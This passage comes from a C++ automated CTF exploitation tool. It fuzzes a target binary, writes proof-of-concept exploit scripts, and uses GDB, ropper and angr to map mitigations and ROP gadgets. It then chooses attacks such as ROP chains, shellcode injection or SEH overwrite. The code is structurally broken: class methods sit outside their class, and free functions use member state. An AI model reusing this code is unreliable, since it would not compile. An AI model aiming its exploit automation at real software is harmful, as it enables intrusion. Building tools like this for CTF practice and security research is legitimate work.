        poc_file << "        proc = subprocess.run([target], input=payload, timeout=10, capture_output=True)" << std::endl;
        poc_file << "        print(f'[+] Process exited with code: {proc.returncode}')" << std::endl;
        poc_file << "        if proc.stdout:" << std::endl;
        poc_file << "            print(f'[+] stdout: {proc.stdout.decode(errors=\"ignore\")}')" << std::endl;
        poc_file << "        if proc.stderr:" << std::endl;
        poc_file << "            print(f'[+] stderr: {proc.stderr.decode(errors=\"ignore\")}')" << std::endl;
        poc_file << "    except subprocess.TimeoutExpired:" << std::endl;
        poc_file << "        print('[!] Process timed out')" << std::endl;
        poc_file << "    except Exception as e:" << std::endl;
        poc_file << "        print(f'[!] Error: {e}')" << std::endl;
        poc_file << std::endl;
        poc_file << "if __name__ == '__main__':" << std::endl;
        poc_file << "    exploit()" << std::endl;
        
        poc_file.close();
        
        // Make executable
        chmod(poc_filename.c_str(), 0755);
        
        std::cout << "[+] Generated PoC: " << poc_filename << std::endl;
    }
    
    // Main fuzzing engine
    void startAdvancedFuzzing(int max_iterations = 10000) {
    std::cout << "[*] Starting enhanced CTF-focused analysis..." << std::endl;
    
    // Step 1: Try symbolic execution first (often fastest for CTFs)
    performSymbolicAnalysis();
    
    // Check if symbolic execution solved it
    for (const auto& sym_result : symbolic_results) {
        if (sym_result.found_flag) {
            std::cout << "[!] Challenge solved via symbolic execution!" << std::endl;
            return;
        }
    }
    
    // Step 2: Analyze I/O patterns
    analyzeIOPatterns();
    
    // Step 3: Try pattern-based solutions
    if (auto_solve_mode && !detected_patterns.empty()) {
        std::cout << "[*] Attempting automatic pattern-based solving..." << std::endl;
        if (testPatternSolutions()) {
            std::cout << "[!] Challenge automatically solved!" << std::endl;
            return;
        }
    }
    
    // Step 4: NEW - Perform adaptive analysis based on challenge classification
    performAdaptiveAnalysis();
    
    // Step 5: NEW - Multi-stage exploit chaining  
    performMultiStageExploitation();
    
    // Rest of existing code...
    auto payloads = generateIntelligentPayloads();
    
    // Add symbolic execution results as additional payloads
    for (const auto& sym_result : symbolic_results) {
        if (!sym_result.input_solution.empty()) {
            payloads.push_back(sym_result.input_solution);
        }
    }
    
    int actual_iterations = std::min(max_iterations, (int)payloads.size());
    
    std::cout << "[*] Beginning execution with " << actual_iterations << " intelligent payloads..." << std::endl;
    
    auto start_time = std::chrono::steady_clock::now();
    
    for (int i = 0; i < actual_iterations; i++) {
        if (i % 50 == 0) {
            auto current_time = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            std::cout << "[*] Progress: " << i << "/" << actual_iterations 
                     << " | Crashes: " << crashes_found 
                     << " | Unique: " << unique_crashes 
                     << " | Exploitable: " << countExploitable() 
                     << " | Time: " << elapsed << "s" << std::endl;
        }
        
        VulnResult result;
        if (executeWithPayload(payloads[i], result)) {
            vulnerabilities.push_back(result);
            saveAdvancedVulnerability(result, i);
            
            if (result.exploitable) {
                generateAdvancedPoC(result, i);
            }
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
    
    printAdvancedSummary();
    generateCTFReport();
}
    
    // Destructor update
    ~AdvancedCTFSolver() {
        if (symbolic_engine) {
            delete symbolic_engine;
        }
        if (gdb_analyzer) {
            delete gdb_analyzer;
        }
    }
    
    // Print comprehensive summary
    void printAdvancedSummary() {
        std::cout << "\n[*] ======= FUZZING CAMPAIGN SUMMARY =======" << std::endl;
        std::cout << "[+] Total test cases: " << total_runs << std::endl;
        std::cout << "[+] Total crashes: " << crashes_found << std::endl;
        std::cout << "[+] Unique crashes: " << unique_crashes << std::endl;
        std::cout << "[+] Exploitable vulnerabilities: " << countExploitable() << std::endl;
        
        if (!vulnerabilities.empty()) {
            std::cout << "\n[*] === VULNERABILITY BREAKDOWN ===" << std::endl;
            std::map<std::string, int> vuln_counts;
            std::map<std::string, int> severity_counts;
            
            for (const auto& vuln : vulnerabilities) {
                vuln_counts[vuln.vuln_type]++;
                severity_counts[vuln.severity]++;
            }
            
            std::cout << "By Type:" << std::endl;
            for (const auto& pair : vuln_counts) {
                std::cout << "  " << pair.first << ": " << pair.second << std::endl;
            }
            
            std::cout << "By Severity:" << std::endl;
            for (const auto& pair : severity_counts) {
                std::cout << "  " << pair.first << ": " << pair.second << std::endl;
            }
            
            // Show most critical vulnerabilities
            std::cout << "\n[*] === CRITICAL VULNERABILITIES ===" << std::endl;
            for (size_t i = 0; i < vulnerabilities.size(); i++) {
                const auto& vuln = vulnerabilities[i];
                if (vuln.exploitable) {
                    std::cout << "[!] #" << i << " - " << vuln.vuln_type 
                             << " (" << vuln.severity << ")" << std::endl;
                    std::cout << "    Technique: " << vuln.exploit_technique << std::endl;
                    std::cout << "    Payload size: " << vuln.payload_size << " bytes" << std::endl;
                }
            }
        }
        
        std::cout << "\n[*] Fuzzing campaign completed!" << std::endl;
    }
    
    void analyzeIOPatterns() {
    std::cout << "[*] Analyzing I/O patterns for automatic solving..." << std::endl;
    
    // Run program with empty input to see initial output
    std::string initial_output = captureOutput("");
    program_outputs["initial"] = initial_output;
    
    // Detect common CTF patterns
    detectNumericChallenges(initial_output);
    detectFormatChallenges(initial_output);
    detectPasswordChallenges(initial_output);
    
    if (!detected_patterns.empty()) {
        std::cout << "[+] Detected " << detected_patterns.size() << " challenge patterns" << std::endl;
        for (const auto& pattern : detected_patterns) {
            std::cout << "    - Type: " << pattern.challenge_type << std::endl;
            if (pattern.is_numeric) {
                std::cout << "      Number: " << pattern.extracted_number << std::endl;
            }
        }
    }
}


// NEW: Detect numeric challenges (like your test case)
void detectNumericChallenges(const std::string& output) {
    // Pattern 1: "Please send 'NUMBER' as a little endian, 32bit integer"
    std::regex little_endian_regex(R"(Please send '(\d+)' as a little endian, (\d+)bit integer)");
    std::smatch match;
    
    if (std::regex_search(output, match, little_endian_regex)) {
        IOPattern pattern;
        pattern.challenge_type = "little_endian_integer";
        pattern.is_numeric = true;
        pattern.extracted_number = std::stoull(match[1].str());
        pattern.bit_size = std::stoi(match[2].str());
        pattern.is_little_endian = true;
        pattern.requires_exact_match = true;
        
        detected_patterns.push_back(pattern);
        std::cout << "[+] Detected little endian integer challenge: " << pattern.extracted_number << std::endl;
        return;
    }
    
    // Pattern 2: "Please send 'NUMBER' as a big endian, 32bit integer"
    std::regex big_endian_regex(R"(Please send '(\d+)' as a big endian, (\d+)bit integer)");
    if (std::regex_search(output, match, big_endian_regex)) {
        IOPattern pattern;
        pattern.challenge_type = "big_endian_integer";
        pattern.is_numeric = true;
        pattern.extracted_number = std::stoull(match[1].str());
        pattern.bit_size = std::stoi(match[2].str());
        pattern.is_little_endian = false;
        pattern.requires_exact_match = true;
        
        detected_patterns.push_back(pattern);
        std::cout << "[+] Detected big endian integer challenge: " << pattern.extracted_number << std::endl;
        return;
    }
    
    // Pattern 3: General number extraction
    std::regex number_regex(R"((\d+))");
    std::sregex_iterator iter(output.begin(), output.end(), number_regex);
    std::sregex_iterator end;
    
    for (; iter != end; ++iter) {
        IOPattern pattern;
        pattern.challenge_type = "generic_number";
        pattern.is_numeric = true;
        pattern.extracted_number = std::stoull(iter->str());
        pattern.bit_size = 32;
        pattern.is_little_endian = true;
        
        detected_patterns.push_back(pattern);
    }
}

// NEW: Detect format string challenges
void detectFormatChallenges(const std::string& output) {
    if (output.find("format") != std::string::npos || 
        output.find("Format") != std::string::npos) {
        IOPattern pattern;
        pattern.challenge_type = "format_string";
        pattern.requires_exact_match = false;
        detected_patterns.push_back(pattern);
    }
}

// NEW: Detect password/string challenges
void detectPasswordChallenges(const std::string& output) {
    std::vector<std::string> password_indicators = {
        "password", "Password", "PASSWORD",
        "secret", "Secret", "SECRET",
        "key", "Key", "KEY",
        "flag", "Flag", "FLAG"
    };
    
    for (const auto& indicator : password_indicators) {
        if (output.find(indicator) != std::string::npos) {
            IOPattern pattern;
            pattern.challenge_type = "password_string";
            pattern.expected_output = indicator;
            detected_patterns.push_back(pattern);
            break;
        }
    }
}

// NEW: Generate payloads for detected patterns
std::vector<std::string> generatePatternBasedPayloads() {
    std::vector<std::string> payloads;
    
    for (const auto& pattern : detected_patterns) {
        if (pattern.challenge_type == "little_endian_integer") {
            std::string payload = convertToLittleEndian(pattern.extracted_number, pattern.bit_size);
            payloads.push_back(payload);
            std::cout << "[+] Generated little endian payload for: " << pattern.extracted_number << std::endl;
        }
        else if (pattern.challenge_type == "big_endian_integer") {
            std::string payload = convertToBigEndian(pattern.extracted_number, pattern.bit_size);
            payloads.push_back(payload);
            std::cout << "[+] Generated big endian payload for: " << pattern.extracted_number << std::endl;
        }
        else if (pattern.challenge_type == "generic_number") {
            // Try multiple representations
            payloads.push_back(std::to_string(pattern.extracted_number));
            payloads.push_back(convertToLittleEndian(pattern.extracted_number, 32));
            payloads.push_back(convertToBigEndian(pattern.extracted_number, 32));
            payloads.push_back(convertToLittleEndian(pattern.extracted_number, 64));
        }
        else if (pattern.challenge_type == "password_string") {
            payloads.push_back(pattern.expected_output);
            payloads.push_back(pattern.expected_output + "\n");
        }
    }
    
    return payloads;
}

// NEW: Convert number to little endian binary
std::string convertToLittleEndian(uint64_t number, int bit_size) {
    std::string result;
    int bytes = bit_size / 8;
    
    for (int i = 0; i < bytes; i++) {
        result += static_cast<char>((number >> (i * 8)) & 0xFF);
    }
    
    return result;
}

// NEW: Convert number to big endian binary
std::string convertToBigEndian(uint64_t number, int bit_size) {
    std::string result;
    int bytes = bit_size / 8;
    
    for (int i = bytes - 1; i >= 0; i--) {
        result += static_cast<char>((number >> (i * 8)) & 0xFF);
    }
    
    return result;
}

// NEW: Test pattern-based solutions first
bool testPatternSolutions() {
    std::cout << "[*] Testing pattern-based solutions..." << std::endl;
    
    auto pattern_payloads = generatePatternBasedPayloads();
    
    for (const auto& payload : pattern_payloads) {
        std::string output = captureOutput(payload);
        
        // Check for success indicators
        if (output.find("successfully") != std::string::npos ||
            output.find("correct") != std::string::npos ||
            output.find("well done") != std::string::npos ||
            output.find("flag") != std::string::npos ||
            output.find("congratulations") != std::string::npos) {
            
            std::cout << "[!] SUCCESS! Solution found!" << std::endl;
            std::cout << "[+] Payload size: " << payload.size() << " bytes" << std::endl;
            std::cout << "[+] Output: " << output << std::endl;
            
            // Save successful solution
            saveSolution(payload, output);
            generateSolutionScript(payload);
            
            return true;
        }
    }
    
    return false;
}

// NEW: Save successful solution
void saveSolution(const std::string& payload, const std::string& output) {
    std::string filename = "solution_" + std::to_string(std::time(nullptr)) + ".txt";
    std::ofstream file(filename);
    
    file << "=== SUCCESSFUL SOLUTION ===" << std::endl;
    file << "Target: " << target_exe << std::endl;
    file << "Timestamp: " << getCurrentTimestamp() << std::endl;
    file << std::endl;
    
    file << "Payload (hex): ";
    for (unsigned char c : payload) {
        file << std::hex << std::setw(2) << std::setfill('0') << (int)c << " ";
    }
    file << std::endl;
    
    file << "Payload (raw): ";
    for (char c : payload) {
        if (std::isprint(c)) {
            file << c;
        } else {
            file << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)(unsigned char)c;
        }
    }
    file << std::endl;
    
    file << std::endl << "Program Output:" << std::endl;
    file << output << std::endl;
    
    file.close();
    std::cout << "[+] Solution saved to: " << filename << std::endl;
}
struct ExploitContext {
    std::string target_arch;
    std::map<std::string, bool> mitigations;
    std::vector<uint64_t> gadget_addresses;
    std::vector<std::string> exploitable_functions;
    std::map<std::string, uint64_t> symbol_table;
    std::string libc_version;
    bool has_aslr = false;
    bool has_dep = false;
    bool has_seh = false;
    std::vector<uint64_t> rop_chain;
    std::string exploit_strategy = "unknown";
};

// AI-driven challenge classification system
class AdaptiveChallengeClassifier {
private:
    std::map<std::string, std::vector<std::string>> challenge_signatures;
    std::map<std::string, double> confidence_scores;
    
public:
    AdaptiveChallengeClassifier() {
        initializeSignatures();
    }
    
    void initializeSignatures() {
        // Binary exploitation signatures
        challenge_signatures["buffer_overflow"] = {
            "gets", "strcpy", "sprintf", "scanf", "strcat", "memcpy",
            "stack smashing", "buffer overflow", "segmentation fault"
        };
        
        challenge_signatures["format_string"] = {
            "printf", "fprintf", "sprintf", "snprintf", "%n", "%s", "%x", "%p"
        };
        
        challenge_signatures["heap_exploitation"] = {
            "malloc", "free", "realloc", "calloc", "use after free", "double free"
        };
        
        challenge_signatures["rop_required"] = {
            "NX enabled", "DEP", "non-executable", "gadget", "return-oriented"
        };
        
        challenge_signatures["seh_exploitation"] = {
            "structured exception", "SEH", "exception handler", "try", "catch"
        };
        
        challenge_signatures["crypto_challenge"] = {
            "encrypt", "decrypt", "cipher", "hash", "key", "AES", "RSA", "base64"
        };
        
        challenge_signatures["reverse_engineering"] = {
            "password", "license", "serial", "crack", "reverse", "disassemble"
        };
        
        challenge_signatures["race_condition"] = {
            "thread", "pthread", "race", "timing", "signal", "concurrent"
        };
    }
    
    std::vector<std::pair<std::string, double>> classifyChallenge(
        const std::string& binary_analysis,
        const std::string& runtime_behavior,
        const std::string& gdb_output) {
        
        std::vector<std::pair<std::string, double>> classifications;
        std::string combined_data = binary_analysis + " " + runtime_behavior + " " + gdb_output;
        
        for (const auto& category : challenge_signatures) {
            double score = calculateConfidence(combined_data, category.second);
            if (score > 0.3) {  // Threshold for consideration
                classifications.push_back({category.first, score});
            }
        }
        
        // Sort by confidence
        std::sort(classifications.begin(), classifications.end(),
                 [](const auto& a, const auto& b) { return a.second > b.second; });
        
        return classifications;
    }
    
private:
    double calculateConfidence(const std::string& data, const std::vector<std::string>& signatures) {
        double matches = 0;
        double total = signatures.size();
        
        std::string lower_data = data;
        std::transform(lower_data.begin(), lower_data.end(), lower_data.begin(), ::tolower);
        
        for (const auto& sig : signatures) {
            std::string lower_sig = sig;
            std::transform(lower_sig.begin(), lower_sig.end(), lower_sig.begin(), ::tolower);
            
            if (lower_data.find(lower_sig) != std::string::npos) {
                matches += 1.0;
            }
        }
        
        return matches / total;
    }
};

// Advanced GDB integration for dynamic analysis
class AdvancedGDBAnalyzer {
private:
    std::string target_binary;
    ExploitContext context;
    
public:
    AdvancedGDBAnalyzer(const std::string& binary) : target_binary(binary) {}
    
    // Comprehensive binary analysis using GDB
    ExploitContext performDeepAnalysis() {
        std::cout << "[*] Starting deep GDB analysis..." << std::endl;
        
        // Step 1: Extract all symbols and addresses
        extractSymbolInformation();
        
        // Step 2: Analyze mitigations
        analyzeMitigations();
        
        // Step 3: Find ROP gadgets
        findROPGadgets();
        
        // Step 4: Detect SEH chains (Windows)
        detectSEHChains();
        
        // Step 5: Analyze heap layout
        analyzeHeapLayout();
        
        // Step 6: Find exploitable functions
        identifyExploitableFunctions();
        
        // Step 7: Build exploit strategy
        buildExploitStrategy();
        
        return context;
    }
    
    void extractSymbolInformation() {
        std::string gdb_script = R"(
set pagination off
set logging file symbols.txt
set logging on
info functions
info variables
info address main
info address system
info address printf
info address gets
info address strcpy
maintenance info sections
quit
        )";
        
        writeGDBScript(gdb_script, "extract_symbols.gdb");
        std::string output = executeGDB("extract_symbols.gdb");
        parseSymbolOutput(output);
    }
    
    void analyzeMitigations() {
        std::string gdb_script = R"(
set pagination off
set logging file mitigations.txt
set logging on
checksec
info proc mappings
show environment
quit
        )";
        
        writeGDBScript(gdb_script, "check_mitigations.gdb");
        std::string output = executeGDB("check_mitigations.gdb");
        parseMitigationOutput(output);
        
        // Also use external tools
        std::string checksec_output = executeCommand("checksec --file=" + target_binary);
        parseChecksecOutput(checksec_output);
    }
    
    void findROPGadgets() {
        std::cout << "[*] Searching for ROP gadgets..." << std::endl;
        
        // Use ropper or ROPgadget
        std::string rop_cmd = "ropper --file " + target_binary + " --search 'pop r?i; ret' 2>/dev/null";
        std::string rop_output = executeCommand(rop_cmd);
        
        if (rop_output.empty()) {
            rop_cmd = "ROPgadget --binary " + target_binary + " --only 'pop|ret' 2>/dev/null";
            rop_output = executeCommand(rop_cmd);
        }
        
        parseROPGadgets(rop_output);
        
        // Also find gadgets using GDB
        findGadgetsWithGDB();
    }
    
    void findGadgetsWithGDB() {
        std::string gdb_script = R"(
set pagination off
set logging file gadgets.txt
set logging on
# Search for common ROP gadgets
x/1000i main
# Look for pop; ret sequences
find 0x400000, 0x500000, 0x58c3  # pop rax; ret
find 0x400000, 0x500000, 0x5fc3  # pop rdi; ret  
find 0x400000, 0x500000, 0x5ec3  # pop rsi; ret
find 0x400000, 0x500000, 0x5ac3  # pop rdx; ret
quit
        )";
        
        writeGDBScript(gdb_script, "find_gadgets.gdb");
        executeGDB("find_gadgets.gdb");
    }
    
    void detectSEHChains() {
        // Windows-specific SEH detection
        std::string gdb_script = R"(
set pagination off
set logging file seh.txt
set logging on
# Check for SEH structures
x/10gx $fs:0
info registers fs
# Look for exception handlers
maintenance info sections .pdata
maintenance info sections .xdata
quit
        )";
        
        writeGDBScript(gdb_script, "detect_seh.gdb");
        executeGDB("detect_seh.gdb");
        context.has_seh = checkSEHPresence();
    }
    
    void analyzeHeapLayout() {
        std::string gdb_script = R"(
set pagination off
set logging file heap.txt
set logging on
# Analyze heap layout
info proc mappings
heap chunks
heap bins
# Check for heap protections
show environment MALLOC_CHECK_
show environment MALLOC_PERTURB_
quit
        )";
        
        writeGDBScript(gdb_script, "analyze_heap.gdb");
        executeGDB("analyze_heap.gdb");
    }
    
    void identifyExploitableFunctions() {
        std::vector<std::string> dangerous_funcs = {
            "gets", "strcpy", "strcat", "sprintf", "scanf", "strncpy",
            "memcpy", "memmove", "printf", "fprintf", "snprintf"
        };
        
        for (const auto& func : dangerous_funcs) {
            if (context.symbol_table.count(func)) {
                context.exploitable_functions.push_back(func);
            }
        }
    }
    
    void buildExploitStrategy() {
        std::cout << "[*] Building adaptive exploit strategy..." << std::endl;
        
        // Determine best exploitation approach
        if (context.mitigations["canary"] && context.mitigations["nx"] && context.mitigations["aslr"]) {
            if (!context.gadget_addresses.empty()) {
                context.exploit_strategy = "info_leak_rop_chain";
                std::cout << "[+] Strategy: Information leak + ROP chain" << std::endl;
            } else {
                context.exploit_strategy = "heap_exploitation";
                std::cout << "[+] Strategy: Heap exploitation" << std::endl;
            }
        } else if (context.mitigations["nx"] && !context.mitigations["aslr"]) {
            context.exploit_strategy = "rop_chain";
            std::cout << "[+] Strategy: ROP chain" << std::endl;
        } else if (!context.mitigations["nx"]) {
            context.exploit_strategy = "shellcode_injection";
            std::cout << "[+] Strategy: Direct shellcode injection" << std::endl;
        } else if (context.has_seh) {
            context.exploit_strategy = "seh_overwrite";
            std::cout << "[+] Strategy: SEH overwrite" << std::endl;
        } else {
            context.exploit_strategy = "classic_overflow";
            std::cout << "[+] Strategy: Classic buffer overflow" << std::endl;
        }
    }
    
private:
    void writeGDBScript(const std::string& script, const std::string& filename) {
        std::ofstream file(filename);
        file << script;
        file.close();
    }
    
    std::string executeGDB(const std::string& script_file) {
        std::string cmd = "gdb -batch -x " + script_file + " " + target_binary + " 2>&1";
        return executeCommand(cmd);
    }
    
    std::string executeCommand(const std::string& cmd) {
        char buffer[128];
        std::string result = "";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (!pipe) return result;
        
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
        return result;
    }
    
    void parseSymbolOutput(const std::string& output) {
        std::regex addr_regex(R"(0x([0-9a-fA-F]+)\s+(\w+))");
        std::smatch match;
        std::string::const_iterator searchStart(output.cbegin());
        
        while (std::regex_search(searchStart, output.cend(), match, addr_regex)) {
            uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
            std::string symbol = match[2].str();
            context.symbol_table[symbol] = addr;
            searchStart = match.suffix().first;
        }
    }
    
    void parseMitigationOutput(const std::string& output) {
        context.mitigations["canary"] = output.find("canary") != std::string::npos;
        context.mitigations["nx"] = output.find("NX") != std::string::npos;
        context.mitigations["aslr"] = output.find("ASLR") != std::string::npos;
        context.mitigations["pie"] = output.find("PIE") != std::string::npos;
        context.mitigations["relro"] = output.find("RELRO") != std::string::npos;
        context.mitigations["fortify"] = output.find("FORTIFY") != std::string::npos;
    }
    
    void parseChecksecOutput(const std::string& output) {
        context.mitigations["canary"] = output.find("Canary found") != std::string::npos;
        context.mitigations["nx"] = output.find("NX enabled") != std::string::npos;
        context.mitigations["pie"] = output.find("PIE enabled") != std::string::npos;
        context.mitigations["relro"] = output.find("Full RELRO") != std::string::npos;
    }
    
    void parseROPGadgets(const std::string& output) {
        std::regex gadget_regex(R"(0x([0-9a-fA-F]+):\s+(.+))");
        std::smatch match;
        std::string::const_iterator searchStart(output.cbegin());
        
        while (std::regex_search(searchStart, output.cend(), match, gadget_regex)) {
            uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
            context.gadget_addresses.push_back(addr);
            searchStart = match.suffix().first;
        }
        
        std::cout << "[+] Found " << context.gadget_addresses.size() << " ROP gadgets" << std::endl;
    }
    
    bool checkSEHPresence() {
        // Check if binary has SEH support (Windows)
        std::string output = executeCommand("objdump -h " + target_binary + " 2>/dev/null");
        return output.find(".pdata") != std::string::npos || 
               output.find(".xdata") != std::string::npos;
    }
};

class SymbolicExecutionEngine {
    
private:
    std::string target_binary;
    std::string angr_script_template;
    std::vector<std::string> target_functions;
    std::vector<std::string> avoid_functions;
    
public:
    SymbolicExecutionEngine(const std::string& binary);
    void setupAngrEnvironment();
    void createAngrScriptTemplate();
    
    // Add these missing method declarations:
    void findFlagStrings(SymbolicResult& result);
    void findVulnerabilityPaths(SymbolicResult& result);
    SymbolicResult performSymbolicExecution(const std::vector<std::string>& find_strings, 
                                           const std::vector<std::string>& avoid_strings);
    
private:
    std::string executeCommand(const std::string& cmd);
    std::string executeCommandWithTimeout(const std::string& cmd, int timeout_seconds);
    void parseSymbolicResults(const std::string& output, SymbolicResult& result);
}; 
    
    void createAngrScriptTemplate() {
    angr_script_template = R"DELIMITER(#!/usr/bin/env python3
import angr
import claripy
import sys
import logging
import json

# Reduce angr verbosity
logging.getLogger('angr').setLevel(logging.CRITICAL)

def symbolic_execution(binary_path, find_addr=None, avoid_addrs=None, find_strings=None, avoid_strings=None):
    print(f"[*] Loading binary: {binary_path}")
    
    try:
        # Load the binary
        project = angr.Project(binary_path, auto_load_libs=False)
        
        # Create initial state
        state = project.factory.entry_state()
        
        # Make stdin symbolic
        stdin = claripy.BVS('stdin', 8 * 1000)  # 1000 bytes symbolic input
        state.posix.stdin.content = [stdin]
        
        # Create simulation manager
        simgr = project.factory.simulation_manager(state)
        
        # Set up find/avoid conditions
        find_conditions = []
        avoid_conditions = []
        
        if find_addr:
            find_conditions.append(int(find_addr, 16))
        if avoid_addrs:
            avoid_conditions.extend([int(addr, 16) for addr in avoid_addrs])
            
        if find_strings:
            def has_find_string(state):
                try:
                    output = state.posix.dumps(1)  # stdout
                    return any(s.encode() in output for s in find_strings)
                except:
                    return False
            find_conditions.append(has_find_string)
            
        if avoid_strings:
            def has_avoid_string(state):
                try:
                    output = state.posix.dumps(1)  # stdout
                    return any(s.encode() in output for s in avoid_strings)
                except:
                    return False
            avoid_conditions.append(has_avoid_string)
        
        # Explore with timeout
        print("[*] Starting symbolic exploration...")
        simgr.explore(find=find_conditions, avoid=avoid_conditions, num_find=5)
        
        results = []
        
        # Process found states
        if simgr.found:
            print(f"[+] Found {len(simgr.found)} solution states!")
            for i, found_state in enumerate(simgr.found):
                try:
                    # Get concrete input
                    concrete_input = found_state.posix.dumps(0)  # stdin
                    concrete_input = concrete_input[:concrete_input.find(b'\x00')]  # Stop at null
                    
                    # Get stdout
                    try:
                        stdout_output = found_state.posix.dumps(1)
                        stdout_str = stdout_output.decode('utf-8', errors='ignore')
                    except:
                        stdout_str = ""
                    
                    result = {
                        'input': concrete_input.decode('utf-8', errors='ignore'),
                        'output': stdout_str,
                        'state_id': f"found_{i}",
                        'pc': hex(found_state.addr)
                    }
                    results.append(result)
                    
                    print(f"[+] Solution {i+1}:")
                    print(f"    Input: {concrete_input}")
                    print(f"    Output preview: {stdout_str[:100]}")
                    
                except Exception as e:
                    print(f"[!] Error processing found state {i}: {e}")
        
        # Process deadended states (potential crashes)
        crash_results = []
        if simgr.deadended:
            print(f"[*] Found {len(simgr.deadended)} deadended states (potential crashes)")
            for i, dead_state in enumerate(simgr.deadended[:5]):  # Limit to 5
                try:
                    concrete_input = dead_state.posix.dumps(0)
                    concrete_input = concrete_input[:concrete_input.find(b'\x00')]
                    
                    crash_result = {
                        'input': concrete_input.decode('utf-8', errors='ignore'),
                        'state_id': f"crash_{i}",
                        'pc': hex(dead_state.addr),
                        'type': 'potential_crash'
                    }
                    crash_results.append(crash_result)
                    
                except Exception as e:
                    print(f"[!] Error processing crash state {i}: {e}")
        
        return {'solutions': results, 'crashes': crash_results}
        
    except Exception as e:
        print(f"[!] Symbolic execution failed: {e}")
        return {'solutions': [], 'crashes': []}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 symbolic_solver.py <binary> [find_addr] [avoid_addr1,avoid_addr2] [find_string] [avoid_string]")
        sys.exit(1)
    
    binary = sys.argv[1]
    find_addr = sys.argv[2] if len(sys.argv) > 2 else None
    avoid_addrs = sys.argv[3].split(',') if len(sys.argv) > 3 and sys.argv[3] else []
    find_strings = [sys.argv[4]] if len(sys.argv) > 4 and sys.argv[4] else ["flag", "success", "correct", "win"]
    avoid_strings = [sys.argv[5]] if len(sys.argv) > 5 and sys.argv[5] else ["wrong", "fail", "error"]
    
    results = symbolic_execution(binary, find_addr, avoid_addrs, find_strings, avoid_strings)
    
    # Output results in a format the C++ tool can parse
    print("=== SYMBOLIC_RESULTS ===")
    print(json.dumps(results))
)DELIMITER";
}
    
    SymbolicResult performSymbolicExecution(const std::vector<std::string>& target_strings = {},
                                           const std::vector<std::string>& avoid_strings = {},
                                           const std::string& find_address = "") {
        SymbolicResult result;
        
        std::cout << "[*] Starting symbolic execution analysis..." << std::endl;
        
        // Create angr script
        std::string script_file = "symbolic_solver.py";
        std::ofstream script(script_file);
        script << angr_script_template;
        script.close();
        chmod(script_file.c_str(), 0755);
        
        // Build command
        std::string cmd = "python3 " + script_file + " " + target_binary;
        
        if (!find_address.empty()) {
            cmd += " " + find_address;
        } else {
            cmd += " \"\"";  // Empty find address
        }
        
        cmd += " \"\"";  // Empty avoid addresses for now
        
        // Add target strings
        if (!target_strings.empty()) {
            cmd += " \"" + target_strings[0] + "\"";
        } else {
            cmd += " \"flag\"";  // Default target
        }
        
        // Add avoid strings
        if (!avoid_strings.empty()) {
            cmd += " \"" + avoid_strings[0] + "\"";
        } else {
            cmd += " \"wrong\"";  // Default avoid
        }
        
        cmd += " 2>/dev/null";
        
        std::cout << "[*] Executing: " << cmd << std::endl;
        
        // Execute symbolic execution with timeout
        std::string output = executeCommandWithTimeout(cmd, 120);  // 2 minute timeout
        
        // Parse results
        parseSymbolicResults(output, result);
        
        // Cleanup
        std::filesystem::remove(script_file);
        
        return result;
    }
    
    void findFlagStrings(SymbolicResult& result) {
        std::cout << "[*] Searching for flag-related paths..." << std::endl;
        
        std::vector<std::string> flag_indicators = {
            "flag{", "FLAG{", "CTF{", "flag", "success", "correct", 
            "well done", "congratulations", "you win", "pwned"
        };
        
        auto flag_result = performSymbolicExecution(flag_indicators, {"wrong", "fail", "error"});
        
        // Merge results
        result.input_solution = flag_result.input_solution;
        result.found_flag = flag_result.found_flag;
        result.flag_content = flag_result.flag_content;
        result.interesting_states.insert(result.interesting_states.end(),
                                       flag_result.interesting_states.begin(),
                                       flag_result.interesting_states.end());
    }
    
    void findVulnerabilityPaths(SymbolicResult& result) {
        std::cout << "[*] Searching for vulnerability paths..." << std::endl;
        
        // Look for dangerous function calls
        std::vector<std::string> vuln_targets = {
            "system", "exec", "gets", "strcpy", "printf"
        };
        
        auto vuln_result = performSymbolicExecution({}, {"exit"});
        
        // Merge crash results
        result.found_crash = vuln_result.found_crash;
        result.interesting_states.insert(result.interesting_states.end(),
                                       vuln_result.interesting_states.begin(),
                                       vuln_result.interesting_states.end());
    }
    
private:
    std::string executeCommandWithTimeout(const std::string& cmd, int timeout_seconds) {
        std::string temp_file = "/tmp/symbolic_output_" + std::to_string(getpid());
        std::string full_cmd = "timeout " + std::to_string(timeout_seconds) + " " + cmd + " > " + temp_file + " 2>&1";
        
        int result = system(full_cmd.c_str());
        (void)result; // Suppress unused warning
        
        // Read output
        std::ifstream file(temp_file);
        std::string output;
        if (file.is_open()) {
            std::stringstream buffer;
            buffer << file.rdbuf();
            output = buffer.str();
            file.close();
        }
        
        std::filesystem::remove(temp_file);
        return output;
    }
    
    void parseSymbolicResults(const std::string& output, SymbolicResult& result) {
        std::cout << "[*] Parsing symbolic execution results..." << std::endl;
        
        // Look for the JSON results section
        size_t json_start = output.find("=== SYMBOLIC_RESULTS ===");
        if (json_start == std::string::npos) {
            std::cout << "[!] No symbolic results found in output" << std::endl;
            return;
        }
        
        std::string json_section = output.substr(json_start + 25);  // Skip marker
        
        // Simple JSON parsing for solutions
        if (json_section.find("\"solutions\"") != std::string::npos) {
            // Extract input solutions
            std::regex input_regex(R"DELIM("input":\s*"([^"]*)")DELIM");
            std::regex output_regex(R"DELIM("output":\s*"([^"]*)")DELIM");
            
            std::smatch input_match, output_match;
            if (std::regex_search(json_section, input_match, input_regex)) {
                result.input_solution = input_match[1].str();
                
                if (std::regex_search(json_section, output_match, output_regex)) {
                    std::string output_str = output_match[1].str();
                    
                    // Check if this looks like a flag or success
                    if (output_str.find("flag") != std::string::npos ||
                        output_str.find("success") != std::string::npos ||
                        output_str.find("correct") != std::string::npos) {
                        result.found_flag = true;
                        result.flag_content = output_str;
                    }
                }
                
                std::cout << "[+] Found symbolic solution!" << std::endl;
                std::cout << "    Input: " << result.input_solution << std::endl;
                if (result.found_flag) {
                    std::cout << "    Flag content: " << result.flag_content << std::endl;
                }
            }
        }
        
        // Check for crashes
